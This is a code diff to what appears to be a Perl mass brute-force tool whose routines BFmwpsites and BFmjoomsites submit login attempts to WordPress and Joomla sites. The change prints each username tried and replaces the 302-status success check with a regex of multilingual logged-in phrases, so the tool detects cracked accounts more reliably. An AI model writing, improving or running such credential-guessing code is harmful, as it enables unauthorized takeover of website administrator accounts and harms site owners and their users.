@@ -3596,6 +3596,12 @@ sub BFmwpsites {
                       'wp-submit' => 'Log in',
                     });
         my $code = $response->code;
+        my $content = $response->content;
+	    print color 'BOLD';
+        print "    USER:   ";
+	    print color RESET;
+	    print "$username\n";
+        
 	    print color 'BOLD';
         print "    PASS:   ";
 	    print color RESET;
@@ -3603,7 +3609,8 @@ sub BFmwpsites {
 	    print color 'BOLD';
         print "    SCAN:   ";
 	    print color RESET;
-        if($code == 302){
+        my $pa='Bienvenido|Welcome|Bienvenue|log off|Cerrar Sesion|Se deconnecter';
+        if ($content =~ /$pa/) {
 	      print color 'green';
           print "$URL1\n";
 	      print color RESET;
@@ -3710,6 +3717,12 @@ sub BFmjoomsites {
                         'submit' => 'Log in',
                       });
         my $code = $response->code;
+        my $content = $response->content;
+	    print color 'BOLD';
+        print "    USER:   ";
+	    print color RESET;
+	    print "$username\n";
+        
 	    print color 'BOLD';
         print "    PASS:   ";
 	    print color RESET;
@@ -3717,7 +3730,8 @@ sub BFmjoomsites {
 	    print color 'BOLD';
         print "    SCAN:   ";
 	    print color RESET;
-        if($code == 302){
+        my $pa='Panel de Control|Control Panel|Bienvenue|log off|Cerrar Sesion|Se deconnecter';
+        if ($content =~ /$pa/) {
 	      print color 'green';
           print "$URL1\n";
 	      print color RESET;
